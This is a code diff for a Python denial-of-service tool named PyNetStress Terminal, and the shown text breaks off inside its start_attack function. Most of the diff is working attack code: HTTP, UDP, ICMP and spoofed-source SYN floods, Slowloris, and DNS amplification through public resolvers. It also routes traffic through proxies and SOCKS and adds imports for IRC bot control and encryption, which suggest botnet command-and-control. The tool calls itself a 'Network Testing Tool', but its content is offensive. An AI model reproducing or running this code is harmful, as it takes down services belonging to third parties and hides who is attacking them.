@@ -12,40 +12,45 @@ import dns.resolver
 import whois
 import speedtest
 import psutil
-import geoip2.database
 import argparse
 from datetime import datetime
 from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor
 import struct
 import select
 import re
+import json
+import ssl
+import http.client
+import socks
+import irc.bot
+import irc.client
+import irc.connection
+import logging
+import readline
+import signal
+import base64
+import zlib
+import hashlib
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
-IS_ROOT = False
-if os.name == 'posix':
-    IS_ROOT = os.geteuid() == 0
-elif os.name == 'nt':
-    import ctypes
-    IS_ROOT = ctypes.windll.shell32.IsUserAnAdmin() != 0
+import colorama
+from colorama import Fore, Back, Style
+colorama.init()
 
 DEBUG_MODE = False
+IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
+IS_ROOT = os.geteuid() == 0 if os.name == 'posix' else False
+VERSION = "2.0.0"
 
-# ASCII Art Banner
-BANNER = r"""
- ________                     __        _______   _______    ______    ______  
-|        \                   |  \      |       \ |       \  /      \  /      \ 
- \$$$$$$$$__    __   ______  | $$   __ | $$$$$$$\| $$$$$$$\|  $$$$$$\|  $$$$$$\
-   | $$  |  \  |  \ /      \ | $$  /  \| $$  | $$| $$  | $$| $$  | $$| $$___\$$
-   | $$  | $$  | $$|  $$$$$$\| $$_/  $$| $$  | $$| $$  | $$| $$  | $$ \$$    \ 
-   | $$  | $$  | $$| $$   \$$| $$   $$ | $$  | $$| $$  | $$| $$  | $$ _\$$$$$$\
-   | $$  | $$__/ $$| $$      | $$$$$$\ | $$__/ $$| $$__/ $$| $$__/ $$|  \__| $$
-   | $$   \$$    $$| $$      | $$  \$$\| $$    $$| $$    $$ \$$    $$ \$$    $$
-    \$$    \$$$$$$  \$$       \$$   \$$ \$$$$$$$  \$$$$$$$   \$$$$$$   \$$$$$$ 
-                                                                               
-                                                                               
-                                                                               
-"""
+TARGET_COLORS = {
+    "down": Fore.RED,
+    "slow": Fore.YELLOW,
+    "rate_limited": Fore.MAGENTA,
+    "banned": Fore.LIGHTMAGENTA_EX,
+    "working": Fore.GREEN,
+    "unknown": Fore.LIGHTRED_EX
+}
 
 class PyNetStressTerminal:
     def __init__(self):
@@ -56,7 +61,7 @@ class PyNetStressTerminal:
             "bytes_sent": 0,
             "start_time": 0,
             "success_rate": 0,
-            "target_status": "Unknown"
+            "target_status": "unknown"
         }
         self.target_ip = ""
         self.target_url = ""
@@ -67,231 +72,341 @@ class PyNetStressTerminal:
         self.method = "HTTP Flood"
         self.use_proxies = False
         self.proxies = []
-        self.cpu_usage = 0
-        self.memory_usage = 0
-        self.network_usage = 0
+        self.proxy_auth = None
+        self.irc_connected = False
+        self.irc_client = None
+        self.local_server = None
+        self.clients = []
+        self.encryption_key = hashlib.sha256(b"default_key").digest()
         
-        # Handle Termux restrictions for network stats
-        if not IS_TERMUX:
-            try:
-                self.start_network_stats = psutil.net_io_counters()
-            except (PermissionError, FileNotFoundError):
-                self.debug_log("Cannot access network statistics on this system")
-                self.start_network_stats = None
-        else:
-            self.start_network_stats = None
-            
-        self.check_dependencies()
-        
-    def debug_log(self, message):
-        if DEBUG_MODE:
-            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-            print(f"[DEBUG] [{timestamp}] {message}")
+        logging.basicConfig(
+            level=logging.DEBUG if DEBUG_MODE else logging.INFO,
+            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler("pynetstress.log"),
+                logging.StreamHandler()
+            ]
+        )
+        self.logger = logging.getLogger("PyNetStress")
     
-    def check_dependencies(self):
-        missing_deps = []
-        try:
-            geoip2.database.Reader('GeoLite2-City.mmdb')
-        except:
-            missing_deps.append("GeoLite2-City database")
-        if missing_deps:
-            self.debug_log("Missing dependencies:")
-            for dep in missing_deps:
-                self.debug_log(f"  - {dep}")
+    def log(self, message, level="info"):
+        if level == "debug":
+            self.logger.debug(message)
+        elif level == "warning":
+            self.logger.warning(message)
+        elif level == "error":
+            self.logger.error(message)
+        else:
+            self.logger.info(message)
     
     def print_banner(self):
-        print(BANNER)
-        print("PyNetStress Terminal Version - Advanced Network Testing Tool")
+        banner = f"""{Fore.CYAN}
+  ____        _   _   _      ____  _             _   
+ |  _ \ _   _| | | | | |_ __/ ___|| |_ ___  _ __| |_ 
+ | |_) | | | | | | | | | '_ \___ \| __/ _ \| '__| __|
+ |  __/| |_| | | | |_| | | | |__) | || (_) | |  | |_ 
+ |_|    \__, |_|  \___/|_| |_|____/ \__\___/|_|   \__|
+        |___/                                         
+        {Style.RESET_ALL}"""
+        print(banner)
+        print(f"{Fore.GREEN}PyNetStress Terminal v{VERSION} - Advanced Network Testing Tool{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Platform: {sys.platform} | Root: {IS_ROOT} | Termux: {IS_TERMUX}{Style.RESET_ALL}")
         print("=" * 60)
-        print(f"Platform: {sys.platform}")
-        print(f"Root: {IS_ROOT}")
-        print(f"Termux: {IS_TERMUX}")
-        print(f"Debug: {DEBUG_MODE}")
-        print("=" * 60)
+    
+    def print_status(self, message, status_type="info"):
+        colors = {
+            "info": Fore.BLUE,
+            "success": Fore.GREEN,
+            "warning": Fore.YELLOW,
+            "error": Fore.RED,
+            "debug": Fore.CYAN
+        }
+        color = colors.get(status_type, Fore.WHITE)
+        print(f"{color}[{status_type.upper()}] {message}{Style.RESET_ALL}")
+    
+    def print_target_status(self, status):
+        color = TARGET_COLORS.get(status, TARGET_COLORS["unknown"])
+        status_text = status.upper().replace("_", " ")
+        print(f"{color}[TARGET] Status: {status_text}{Style.RESET_ALL}")
+    
+    def encrypt_data(self, data):
+        cipher = AES.new(self.encryption_key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
+        return base64.b64encode(cipher.iv + ct_bytes).decode()
+    
+    def decrypt_data(self, enc_data):
+        enc_data = base64.b64decode(enc_data)
+        iv = enc_data[:16]
+        ct = enc_data[16:]
+        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
+        pt = unpad(cipher.decrypt(ct), AES.block_size)
+        return pt.decode()
     
     def resolve_target(self, target):
         try:
-            self.debug_log(f"Resolving target: {target}")
             if not re.match(r"^https?://", target):
                 target = "http://" + target
+            
             parsed = urlparse(target)
             domain = parsed.netloc or parsed.path
+            
             if ":" in domain:
                 domain = domain.split(":")[0]
+                
             self.target_ip = socket.gethostbyname(domain)
             self.target_url = domain
-            self.debug_log(f"Resolved {target} to {self.target_ip}")
             return True
         except Exception as e:
-            self.debug_log(f"Failed to resolve target: {e}")
+            self.print_status(f"Failed to resolve target: {e}", "error")
             return False
     
-    def get_geolocation(self, target):
+    def check_target_status(self):
         try:
-            self.debug_log(f"Getting geolocation for: {target}")
-            reader = geoip2.database.Reader('GeoLite2-City.mmdb')
-            response = reader.city(target)
-            country = response.country.name
-            city = response.city.name
-            return f"{city}, {country}"
-        except Exception as e:
-            self.debug_log(f"Geolocation failed: {e}")
-            return "Location unknown"
-    
-    def reset_stats(self):
-        self.debug_log("Resetting statistics")
-        self.attack_stats = {
-            "packets_sent": 0,
-            "requests_sent": 0,
-            "bytes_sent": 0,
-            "start_time": time.time(),
-            "success_rate": 0,
-            "target_status": "Unknown"
-        }
-        
-        # Only reset network stats if we can access them
-        if not IS_TERMUX:
+            start_time = time.time()
+            
             try:
-                self.start_network_stats = psutil.net_io_counters()
-            except (PermissionError, FileNotFoundError):
-                self.start_network_stats = None
-        
-        self.debug_log("Statistics reset")
+                conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=5)
+                conn.request("HEAD", "/")
+                response = conn.getresponse()
+                response_time = (time.time() - start_time) * 1000
+                
+                if response.status == 200:
+                    if response_time < 100:
+                        return "working"
+                    elif response_time < 1000:
+                        return "slow"
+                    else:
+                        return "rate_limited"
+                elif response.status in [429, 503]:
+                    return "rate_limited"
+                elif response.status in [403, 401]:
+                    return "banned"
+                else:
+                    return "down"
+            except:
+                pass
+            
+            try:
+                if os.name == 'nt':
+                    cmd = ['ping', '-n', '1', '-w', '1000', self.target_ip]
+                else:
+                    cmd = ['ping', '-c', '1', '-W', '1', self.target_ip]
+                
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                if result.returncode == 0:
+                    return "working"
+                else:
+                    return "down"
+            except:
+                pass
+            
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                result = sock.connect_ex((self.target_ip, self.target_port))
+                sock.close()
+                
+                if result == 0:
+                    return "working"
+                else:
+                    return "down"
+            except:
+                pass
+            
+            return "unknown"
+        except Exception as e:
+            self.log(f"Error checking target status: {e}", "error")
+            return "unknown"
     
-    def http_flood(self, target_ip, target_port, bot_count, thread_count, duration):
-        self.debug_log(f"Starting HTTP Flood on {target_ip}:{target_port}")
+    def load_proxies(self, proxy_file=None):
+        if proxy_file and os.path.exists(proxy_file):
+            try:
+                with open(proxy_file, 'r') as f:
+                    self.proxies = [line.strip() for line in f.readlines() if line.strip()]
+                self.print_status(f"Loaded {len(self.proxies)} proxies from {proxy_file}", "success")
+                return True
+            except Exception as e:
+                self.print_status(f"Failed to load proxies: {e}", "error")
+                return False
+        return False
+    
+    def get_proxy(self):
+        if not self.proxies:
+            return None
+        
+        proxy = random.choice(self.proxies)
+        if "://" in proxy:
+            return proxy
+        
+        if "@" in proxy:
+            auth, proxy = proxy.split("@", 1)
+            self.proxy_auth = base64.b64encode(auth.encode()).decode()
+        
+        return f"http://{proxy}"
+    
+    def http_flood(self):
+        self.print_status("Starting HTTP Flood attack", "info")
+        
         user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         ]
+        
         paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
         methods = ['GET', 'POST', 'HEAD']
-        host = self.target_url if self.target_url else target_ip
+        host = self.target_url if self.target_url else self.target_ip
+        
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def http_worker():
             local_count = 0
             local_bytes = 0
+            
             while time.time() < end_time and self.running:
                 try:
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        s.settimeout(2.0)
-                        self.debug_log(f"Connecting to {target_ip}:{target_port}")
-                        s.connect((target_ip, target_port))
-                        method = random.choice(methods)
-                        path = random.choice(paths)
-                        request = (
-                            f"{method} {path} HTTP/1.1\r\n"
-                            f"Host: {host}\r\n"
-                            f"User-Agent: {random.choice(user_agents)}\r\n"
-                            f"Accept: */*\r\n"
-                            f"Connection: close\r\n"
-                            f"\r\n"
-                        )
-                        s.send(request.encode())
-                        local_count += 1
-                        local_bytes += len(request)
-                        try:
-                            response = s.recv(1024)
-                            local_bytes += len(response)
-                            self.debug_log(f"Received response: {len(response)} bytes")
-                        except Exception as e:
-                            self.debug_log(f"No response received: {e}")
-                        if local_count % 10 == 0:
-                            with threading.Lock():
-                                self.attack_stats['requests_sent'] += local_count
-                                self.attack_stats['bytes_sent'] += local_bytes
-                                local_count = 0
-                                local_bytes = 0
+                    proxy = self.get_proxy() if self.use_proxies else None
+                    
+                    if proxy:
+                        parsed = urlparse(proxy)
+                        conn = http.client.HTTPConnection(parsed.hostname, parsed.port)
+                        if self.proxy_auth:
+                            conn.set_tunnel(self.target_ip, self.target_port, 
+                                          {"Proxy-Authorization": f"Basic {self.proxy_auth}"})
+                        else:
+                            conn.set_tunnel(self.target_ip, self.target_port)
+                    else:
+                        conn = http.client.HTTPConnection(self.target_ip, self.target_port)
+                    
+                    method = random.choice(methods)
+                    path = random.choice(paths)
+                    
+                    headers = {
+                        'Host': host,
+                        'User-Agent': random.choice(user_agents),
+                        'Accept': '*/*',
+                        'Connection': 'close'
+                    }
+                    
+                    conn.request(method, path, headers=headers)
+                    response = conn.getresponse()
+                    response.read()
+                    
+                    local_count += 1
+                    local_bytes += len(str(headers)) + len(path) + 10
+                    
+                    if local_count % 10 == 0:
+                        with threading.Lock():
+                            self.attack_stats['requests_sent'] += local_count
+                            self.attack_stats['bytes_sent'] += local_bytes
+                            local_count = 0
+                            local_bytes = 0
+                    
+                    conn.close()
                 except Exception as e:
-                    self.debug_log(f"HTTP worker error: {e}")
+                    self.log(f"HTTP worker error: {e}", "debug")
+            
             if local_count > 0:
                 with threading.Lock():
                     self.attack_stats['requests_sent'] += local_count
                     self.attack_stats['bytes_sent'] += local_bytes
-
+        
         threads = []
-        for i in range(min(500, thread_count * bot_count)):
-            t = threading.Thread(target=http_worker, name=f"HTTP_Worker_{i}")
+        for i in range(min(500, self.thread_count * self.bot_count)):
+            t = threading.Thread(target=http_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started HTTP worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("HTTP Flood completed")
+        
+        self.print_status("HTTP Flood completed", "success")
     
-    def udp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
+    def udp_flood(self):
         if not IS_ROOT and os.name == 'posix':
-            self.debug_log("UDP Flood requires root on Unix systems")
+            self.print_status("UDP Flood requires root privileges", "error")
             return
-        self.debug_log(f"Starting UDP Flood on {target_ip}:{target_port}")
+        
+        self.print_status("Starting UDP Flood attack", "info")
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def udp_worker():
             local_count = 0
             local_bytes = 0
+            
             while time.time() < end_time and self.running:
                 try:
-                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                        payload = os.urandom(random.randint(64, 1024))
-                        self.debug_log(f"Sending UDP packet to {target_ip}:{target_port}")
-                        s.sendto(payload, (target_ip, target_port))
-                        local_count += 1
-                        local_bytes += len(payload)
-                        if local_count % 50 == 0:
-                            with threading.Lock():
-                                self.attack_stats['packets_sent'] += local_count
-                                self.attack_stats['bytes_sent'] += local_bytes
-                                local_count = 0
-                                local_bytes = 0
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    
+                    if self.use_proxies and self.proxies:
+                        proxy = random.choice(self.proxies)
+                        if ":" in proxy:
+                            host, port = proxy.split(":")
+                            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+                            sock.set_proxy(socks.SOCKS5, host, int(port))
+                    
+                    payload = os.urandom(random.randint(64, 1024))
+                    sock.sendto(payload, (self.target_ip, self.target_port))
+                    
+                    local_count += 1
+                    local_bytes += len(payload)
+                    
+                    if local_count % 50 == 0:
+                        with threading.Lock():
+                            self.attack_stats['packets_sent'] += local_count
+                            self.attack_stats['bytes_sent'] += local_bytes
+                            local_count = 0
+                            local_bytes = 0
+                    
+                    sock.close()
                 except Exception as e:
-                    self.debug_log(f"UDP worker error: {e}")
+                    self.log(f"UDP worker error: {e}", "debug")
+            
             if local_count > 0:
                 with threading.Lock():
                     self.attack_stats['packets_sent'] += local_count
                     self.attack_stats['bytes_sent'] += local_bytes
-
+        
         threads = []
-        for i in range(min(500, thread_count * bot_count)):
-            t = threading.Thread(target=udp_worker, name=f"UDP_Worker_{i}")
+        for i in range(min(500, self.thread_count * self.bot_count)):
+            t = threading.Thread(target=udp_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started UDP worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("UDP Flood completed")
+        
+        self.print_status("UDP Flood completed", "success")
     
-    def syn_flood(self, target_ip, target_port, bot_count, thread_count, duration):
+    def syn_flood(self):
         if not IS_ROOT:
-            self.debug_log("SYN Flood requires root privileges")
+            self.print_status("SYN Flood requires root privileges", "error")
             return
-        self.debug_log(f"Starting SYN Flood on {target_ip}:{target_port}")
+        
+        self.print_status("Starting SYN Flood attack", "info")
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def syn_worker():
             local_count = 0
+            
             while time.time() < end_time and self.running:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                    source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-                    self.debug_log(f"Using spoofed source IP: {source_ip}")
                     
-                    # IP header
+                    source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+                    
                     ip_ver = 4
                     ip_ihl = 5
                     ip_tos = 0
@@ -302,7 +417,8 @@ class PyNetStressTerminal:
                     ip_proto = socket.IPPROTO_TCP
                     ip_check = 0
                     ip_saddr = socket.inet_aton(source_ip)
-                    ip_daddr = socket.inet_aton(target_ip)
+                    ip_daddr = socket.inet_aton(self.target_ip)
+                    
                     ip_ihl_ver = (ip_ver << 4) + ip_ihl
                     
                     ip_header = struct.pack('!BBHHHBBH4s4s',
@@ -310,9 +426,8 @@ class PyNetStressTerminal:
                                         ip_frag_off, ip_ttl, ip_proto, ip_check,
                                         ip_saddr, ip_daddr)
                     
-                    # TCP header
                     source_port = random.randint(1024, 65535)
-                    dest_port = target_port
+                    dest_port = self.target_port
                     seq = random.randint(0, 4294967295)
                     ack_seq = 0
                     doff = 5
@@ -333,9 +448,8 @@ class PyNetStressTerminal:
                                          source_port, dest_port, seq, ack_seq,
                                          offset_res, tcp_flags, window, check, urg_ptr)
                     
-                    # Pseudo header for checksum
                     source_address = socket.inet_aton(source_ip)
-                    dest_address = socket.inet_aton(target_ip)
+                    dest_address = socket.inet_aton(self.target_ip)
                     placeholder = 0
                     protocol = socket.IPPROTO_TCP
                     tcp_length = len(tcp_header)
@@ -345,18 +459,14 @@ class PyNetStressTerminal:
                                   placeholder, protocol, tcp_length)
                     psh = psh + tcp_header
                     
-                    # Calculate checksum
                     tcp_check = self.checksum(psh)
                     
-                    # Repack with correct checksum
                     tcp_header = struct.pack('!HHLLBBH',
                                          source_port, dest_port, seq, ack_seq,
                                          offset_res, tcp_flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)
                     
-                    # Send packet
                     packet = ip_header + tcp_header
-                    self.debug_log(f"Sending SYN packet to {target_ip}:{target_port}")
-                    s.sendto(packet, (target_ip, 0))
+                    s.sendto(packet, (self.target_ip, 0))
                     
                     local_count += 1
                     
@@ -364,76 +474,74 @@ class PyNetStressTerminal:
                         with threading.Lock():
                             self.attack_stats['packets_sent'] += local_count
                             local_count = 0
-                            
+                    
+                    s.close()
                 except Exception as e:
-                    self.debug_log(f"SYN worker error: {e}")
+                    self.log(f"SYN worker error: {e}", "debug")
+            
             if local_count > 0:
                 with threading.Lock():
                     self.attack_stats['packets_sent'] += local_count
-
+        
         threads = []
-        for i in range(min(200, thread_count * bot_count)):
-            t = threading.Thread(target=syn_worker, name=f"SYN_Worker_{i}")
+        for i in range(min(200, self.thread_count * self.bot_count)):
+            t = threading.Thread(target=syn_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started SYN worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("SYN Flood completed")
+        
+        self.print_status("SYN Flood completed", "success")
     
     def checksum(self, msg):
         s = 0
         for i in range(0, len(msg), 2):
             w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
             s = s + w
+        
         s = (s >> 16) + (s & 0xffff)
         s = s + (s >> 16)
         s = ~s & 0xffff
         return s
     
-    def icmp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
+    def icmp_flood(self):
         if not IS_ROOT and os.name == 'posix':
-            self.debug_log("ICMP Flood requires root on Unix systems")
+            self.print_status("ICMP Flood requires root privileges", "error")
             return
-        self.debug_log(f"Starting ICMP Flood on {target_ip}")
+        
+        self.print_status("Starting ICMP Flood attack", "info")
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def icmp_worker():
             local_count = 0
             local_bytes = 0
+            
             while time.time() < end_time and self.running:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                     
-                    # ICMP echo request (ping)
-                    icmp_type = 8  # Echo Request
+                    icmp_type = 8
                     icmp_code = 0
                     icmp_check = 0
                     icmp_id = random.randint(0, 65535)
                     icmp_seq = random.randint(0, 65535)
                     
-                    # Build ICMP header
                     icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                     
-                    # Add some payload
                     payload = os.urandom(random.randint(32, 1024))
                     
-                    # Calculate checksum
                     icmp_check = self.checksum(icmp_header + payload)
                     
-                    # Repack with correct checksum
                     icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                     
-                    # Send packet
                     packet = icmp_header + payload
-                    self.debug_log(f"Sending ICMP packet to {target_ip}")
-                    s.sendto(packet, (target_ip, 0))
+                    s.sendto(packet, (self.target_ip, 0))
                     
                     local_count += 1
                     local_bytes += len(packet)
@@ -444,33 +552,35 @@ class PyNetStressTerminal:
                             self.attack_stats['bytes_sent'] += local_bytes
                             local_count = 0
                             local_bytes = 0
-                            
+                    
+                    s.close()
                 except Exception as e:
-                    self.debug_log(f"ICMP worker error: {e}")
+                    self.log(f"ICMP worker error: {e}", "debug")
+            
             if local_count > 0:
                 with threading.Lock():
                     self.attack_stats['packets_sent'] += local_count
                     self.attack_stats['bytes_sent'] += local_bytes
-
+        
         threads = []
-        for i in range(min(200, thread_count * bot_count)):
-            t = threading.Thread(target=icmp_worker, name=f"ICMP_Worker_{i}")
+        for i in range(min(200, self.thread_count * self.bot_count)):
+            t = threading.Thread(target=icmp_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started ICMP worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("ICMP Flood completed")
+        
+        self.print_status("ICMP Flood completed", "success")
     
-    def slowloris(self, target_ip, target_port, bot_count, thread_count, duration):
-        self.debug_log(f"Starting Slowloris on {target_ip}:{target_port}")
+    def slowloris(self):
+        self.print_status("Starting Slowloris attack", "info")
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def slowloris_worker():
             sockets = []
@@ -479,21 +589,18 @@ class PyNetStressTerminal:
                 "Accept-language: en-US,en,q=0.5"
             ]
             
-            # Create initial sockets
             for i in range(150):
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(3)
-                    self.debug_log(f"Creating Slowloris connection #{i}")
-                    s.connect((target_ip, target_port))
+                    s.connect((self.target_ip, self.target_port))
                     s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                     for header in headers:
                         s.send(f"{header}\r\n".encode())
                     sockets.append(s)
                 except Exception as e:
-                    self.debug_log(f"Slowloris socket error: {e}")
+                    self.log(f"Slowloris socket error: {e}", "debug")
             
-            # Maintain connections
             while time.time() < end_time and self.running:
                 for s in sockets:
                     try:
@@ -507,50 +614,47 @@ class PyNetStressTerminal:
                         except:
                             pass
                         
-                        # Try to create a new socket
                         try:
                             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             s.settimeout(3)
-                            s.connect((target_ip, target_port))
+                            s.connect((self.target_ip, self.target_port))
                             s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                             for header in headers:
                                 s.send(f"{header}\r\n".encode())
                             sockets.append(s)
-                            self.debug_log("Replaced failed Slowloris connection")
                         except:
                             pass
                 
-                time.sleep(15)  # Send keep-alive headers periodically
+                time.sleep(15)
             
-            # Close all sockets
             for s in sockets:
                 try:
                     s.close()
                 except:
                     pass
-
+        
         threads = []
-        for i in range(min(50, bot_count)):
-            t = threading.Thread(target=slowloris_worker, name=f"Slowloris_Worker_{i}")
+        for i in range(min(50, self.bot_count)):
+            t = threading.Thread(target=slowloris_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started Slowloris worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("Slowloris completed")
-    
-    def dns_amplification(self, target_ip, target_port, bot_count, thread_count, duration):
-        if not IS_ROOT and os.name == 'posix':
-            self.debug_log("DNS Amplification requires root on Unix systems")
-            return
-        self.debug_log(f"Starting DNS Amplification on {target_ip}")
         
-        # List of open DNS resolvers
+        self.print_status("Slowloris completed", "success")
+    
+    def dns_amplification(self):
+        if not IS_ROOT and os.name == 'posix':
+            self.print_status("DNS Amplification requires root privileges", "error")
+            return
+        
+        self.print_status("Starting DNS Amplification attack", "info")
+        
         dns_servers = [
             "8.8.8.8",
             "1.1.1.1",
@@ -559,11 +663,10 @@ class PyNetStressTerminal:
             "208.67.222.222",
         ]
         
-        # DNS query for isc.org (large response)
         query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"
         
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         def dns_worker():
             local_count = 0
@@ -574,12 +677,9 @@ class PyNetStressTerminal:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     s.settimeout(1)
                     
-                    # Spoof source IP to target
                     s.bind(('0.0.0.0', 0))
                     
-                    # Send to random DNS server
                     dns_server = random.choice(dns_servers)
-                    self.debug_log(f"Sending DNS query to {dns_server} spoofing {target_ip}")
                     s.sendto(query, (dns_server, 53))
                     
                     local_count += 1
@@ -591,108 +691,97 @@ class PyNetStressTerminal:
                             self.attack_stats['bytes_sent'] += local_bytes
                             local_count = 0
                             local_bytes = 0
-                            
+                    
+                    s.close()
                 except Exception as e:
-                    self.debug_log(f"DNS worker error: {e}")
+                    self.log(f"DNS worker error: {e}", "debug")
+            
             if local_count > 0:
                 with threading.Lock():
                     self.attack_stats['packets_sent'] += local_count
                     self.attack_stats['bytes_sent'] += local_bytes
-
+        
         threads = []
-        for i in range(min(500, thread_count * bot_count)):
-            t = threading.Thread(target=dns_worker, name=f"DNS_Worker_{i}")
+        for i in range(min(500, self.thread_count * self.bot_count)):
+            t = threading.Thread(target=dns_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            self.debug_log(f"Started DNS worker thread {i}")
+        
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-        self.debug_log("DNS Amplification completed")
-    
-    def mixed_attack(self, target_ip, target_port, bot_count, thread_count, duration):
-        self.debug_log(f"Starting MIXED attack on {target_ip}:{target_port}")
         
-        # All attack methods with equal weight
+        self.print_status("DNS Amplification completed", "success")
+    
+    def mixed_attack(self):
+        if IS_TERMUX:
+            self.print_status("Mixed Attack not available on Termux", "error")
+            return
+        
+        self.print_status("Starting Mixed Attack (all methods)", "info")
+        
         methods = [
-            (self.http_flood, 1),
-            (self.udp_flood, 1),
-            (self.syn_flood, 1),
-            (self.icmp_flood, 1),
-            (self.slowloris, 1),
-            (self.dns_amplification, 1)
+            self.http_flood,
+            self.udp_flood,
+            self.syn_flood,
+            self.icmp_flood,
+            self.slowloris,
+            self.dns_amplification
         ]
         
         threads = []
         
-        for method, weight in methods:
-            for _ in range(weight):
-                t = threading.Thread(
-                    target=method,
-                    args=(target_ip, target_port, bot_count, thread_count, duration),
-                    daemon=True
-                )
-                t.start()
-                threads.append(t)
-                self.debug_log(f"Started {method.__name__} thread")
+        for method in methods:
+            t = threading.Thread(target=method)
+            t.daemon = True
+            t.start()
+            threads.append(t)
         
         start_time = time.time()
-        end_time = start_time + duration
+        end_time = start_time + self.duration
         
         try:
             for t in threads:
                 t.join(timeout=max(0, end_time - time.time()))
         except KeyboardInterrupt:
             self.running = False
-            self.debug_log("Attack stopped by user")
-            
-        self.debug_log("Mixed attack completed")
+        
+        self.print_status("Mixed Attack completed", "success")
     
-    def start_attack(self, target, method, bots=100, threads=50, duration=30, port=80):
-        if not self.resolve_target(target):
+    def start_attack(self):
+        if not self.resolve_target(self.target_url):
             return False
         
-        self.target_port = port
-        self.bot_count = min(bots, 10000)
-        self.thread_count = min(threads, 500)
-        self.duration = min(duration, 300)
-        self.method = method
-        
-        self.reset_stats()
-        
-        geo = self.get_geolocation(self.target_ip)
-        print(f"[INFO] Target: {target} -> {self.target_ip}:{port}")
-        print(f"[INFO] Location: {geo}")
-        print(f"[INFO] Method: {method}, Bots: {bots}, Threads: {threads}, Duration: {duration}s")
-        print("-" * 60)
-        
+        self.attack_stats['start_time'] = time.time()
         self.running = True
         
-        # Start stats monitor
-        stats_thread = threading.Thread(target=self.monitor_stats, daemon=True)
+        status = self.check_target_status()
+        self.attack_stats['target_status'] = status
+        self.print_target_status(status)
+        
+        stats_thread = threading.Thread(target=self.monitor_stats)
+        stats_thread.daemon = True
         stats_thread.start()
         
-        # Run the selected attack method
-        if method == "HTTP Flood":
-            self.http_flood(self.target_ip, port, bots, threads, duration)
-        elif method == "UDP Flood":
-            self.udp_flood(self.target_ip, port, bots, threads, duration)
-        elif method == "SYN Flood":
